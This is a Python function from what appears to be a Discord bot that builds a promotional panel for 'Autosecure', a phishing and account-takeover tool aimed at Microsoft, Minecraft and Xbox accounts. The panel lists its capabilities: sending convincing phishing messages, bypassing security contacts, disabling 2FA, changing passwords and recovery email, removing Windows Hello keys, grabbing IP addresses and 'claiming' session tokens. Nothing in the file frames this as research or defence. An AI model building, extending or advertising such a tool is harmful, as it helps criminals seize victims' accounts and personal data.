
import discord

def feature_panel():
    embed = discord.Embed(
        title="Autosecure Features",
        description="The most trusted Autosecure",
        color=0xC8C8C8 
    )
    
    embed.add_field(
        name="Phisher",
        value="- Multiple verification modes\n- Verifies email\n- Sends convincing messages\n- Bypasses security emails & phonenumbers.\n- Stat embeds\n- Anti-spam support\n- Ban / kick / unban / blacklist buttons",
        inline=False
    )
    embed.add_field(
        name="Autosecure",
        value="- Disables 2FA\n- Creates a recovery code\n- Changes security email\n- Changes password\n- Removes Windows Hello keys\n- Signs out of all locations\n- Checks Minecraft & Xbox\n- Grabs IP addresses",
        inline=False
    )
    embed.add_field(
        name="Optional",
        value="- Secure if no MC\n- Disable multiplayer\n- Change primary alias\n- Change Minecraft username\n- Auto Zyger 2FA\n- Removes all apps / OAuths",
        inline=False
    )
    embed.add_field(
        name="Claiming",
        value="- Full info\n- SSID only\n- Auto-Split options",
        inline=False
    )
    return embed
